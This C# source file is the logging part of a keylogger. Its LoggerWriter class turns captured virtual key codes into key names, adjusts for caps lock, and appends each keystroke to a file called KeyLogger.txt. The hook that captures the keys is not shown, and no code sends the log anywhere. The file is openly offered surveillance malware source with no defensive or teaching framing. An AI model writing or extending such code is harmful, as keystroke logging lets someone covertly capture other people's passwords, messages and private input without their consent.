using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection.Emit;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace IP
{
    public class LoggerWriter
    {
        public static void WriteToLog(int vkCode, String path)
        {
            bool _isCapital = Control.IsKeyLocked(Keys.CapsLock);

            using (StreamWriter outputFile = new StreamWriter(Path.Combine(path, "KeyLogger.txt"), true))
            {
                if(vkCode == 0x14) {}
                else if (vkCode == 0x20) 
                {
                    outputFile.WriteAsync(" ");
                }
                else if (vkCode == 0x0D)
                {
                    outputFile.WriteAsync('\n' + "ENTER" + '\n');
                }
                else
                {
                    string s = ((Keys)vkCode).ToString();
                    if (_isCapital)
                        outputFile.WriteAsync(s);
                    else
                        outputFile.WriteAsync(s.ToLower());
                }
            }
        }
    }
}
